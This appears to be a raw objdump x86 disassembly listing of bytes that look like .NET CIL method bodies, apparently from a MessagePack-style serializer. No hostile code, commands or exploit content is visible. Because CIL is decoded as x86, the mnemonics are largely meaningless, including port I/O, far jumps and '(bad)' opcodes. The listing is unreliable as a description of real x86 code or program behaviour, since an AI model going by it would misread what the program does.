  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
